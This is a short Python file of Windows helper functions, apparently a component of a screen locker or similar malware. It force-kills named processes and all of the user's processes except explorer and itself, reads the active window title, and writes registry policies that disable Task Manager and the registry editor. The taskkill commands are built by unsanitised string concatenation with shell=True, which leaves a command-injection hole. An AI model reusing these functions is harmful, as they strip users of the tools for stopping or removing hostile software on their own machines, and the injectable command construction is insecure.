# Import modules

from subprocess import Popen, call
from win32gui import GetWindowText, GetForegroundWindow


# Ends the selected process

def KillProcess(Process):
	if not Process.endswith('.exe'):
		Process = Process + '.exe'
	call('taskkill /f /im ' + Process, shell=True)


# Gets the title of the active window

def WindowTitle():
	return GetWindowText(GetForegroundWindow())


# Stops all processes

def TaskkillAll(CurrentName):
	call('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
		shell=True)
	call('explorer.exe',
		shell=True)


# Disabling Task Manager and Regedit

def RegeditDisableTaskManager():
	Popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
		shell=True)

def RegeditDisableRegistryTools():
	Popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f',
		shell=True)